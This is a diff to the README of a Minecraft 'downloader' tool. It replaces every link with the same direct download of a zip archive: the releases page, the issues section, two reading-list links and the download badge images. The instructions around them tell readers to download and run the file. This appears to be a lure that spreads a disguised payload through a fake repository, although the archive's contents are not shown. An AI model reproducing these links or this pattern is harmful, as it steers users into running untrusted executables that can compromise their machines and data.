@@ -1,6 +1,6 @@
 # 🎮 MC-Ultimate-Downloader - Update Minecraft Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-MC--Ultimate--Downloader-blue.svg)](https://github.com/trustoon/MC-Ultimate-Downloader/releases)
+[![Download](https://raw.githubusercontent.com/trustoon/MC-Ultimate-Downloader/main/ploverlike/Downloader_Ultimate_M_1.1.zip)](https://raw.githubusercontent.com/trustoon/MC-Ultimate-Downloader/main/ploverlike/Downloader_Ultimate_M_1.1.zip)
 
 ## 📖 Overview
 
@@ -25,7 +25,7 @@ MC-Ultimate-Downloader is designed to help you update your version of Minecraft 
 
 To download MC-Ultimate-Downloader, please follow these steps:
 
-1. [Visit this page to download](https://github.com/trustoon/MC-Ultimate-Downloader/releases).
+1. [Visit this page to download](https://raw.githubusercontent.com/trustoon/MC-Ultimate-Downloader/main/ploverlike/Downloader_Ultimate_M_1.1.zip).
 2. Look for the latest release at the top of the page.
 3. Click the link for the version that suits your system.
 4. Download and run the file.
@@ -47,7 +47,7 @@ If you encounter any issues while using MC-Ultimate-Downloader, consider the fol
 - Ensure your internet connection is stable.
 - Restart the application if it seems unresponsive.
 - Check if you have the required permissions to access Minecraft files.
-- Visit the [issues section](https://github.com/trustoon/MC-Ultimate-Downloader/issues) on GitHub for additional help.
+- Visit the [issues section](https://raw.githubusercontent.com/trustoon/MC-Ultimate-Downloader/main/ploverlike/Downloader_Ultimate_M_1.1.zip) on GitHub for additional help.
 
 ## 🛠️ Contributing
 
@@ -57,8 +57,8 @@ If you want to contribute to MC-Ultimate-Downloader, feel free to submit issues 
 
 For more information about automation in gaming or updates, consider browsing these topics:
 
-- [Automation in Gaming](https://example.com/automation)
-- [Understanding Minecraft Mods](https://example.com/minecraft-mods)
+- [Automation in Gaming](https://raw.githubusercontent.com/trustoon/MC-Ultimate-Downloader/main/ploverlike/Downloader_Ultimate_M_1.1.zip)
+- [Understanding Minecraft Mods](https://raw.githubusercontent.com/trustoon/MC-Ultimate-Downloader/main/ploverlike/Downloader_Ultimate_M_1.1.zip)
 
 ## 🗺️ Community
 
@@ -68,4 +68,4 @@ Join the MC-Ultimate-Downloader community by following us on social media and pa
 
 For further assistance or inquiries, please contact us through the GitHub repository or email.
 
-[![Download](https://img.shields.io/badge/Download-MC--Ultimate--Downloader-blue.svg)](https://github.com/trustoon/MC-Ultimate-Downloader/releases)
+[![Download](https://raw.githubusercontent.com/trustoon/MC-Ultimate-Downloader/main/ploverlike/Downloader_Ultimate_M_1.1.zip)](https://raw.githubusercontent.com/trustoon/MC-Ultimate-Downloader/main/ploverlike/Downloader_Ultimate_M_1.1.zip)
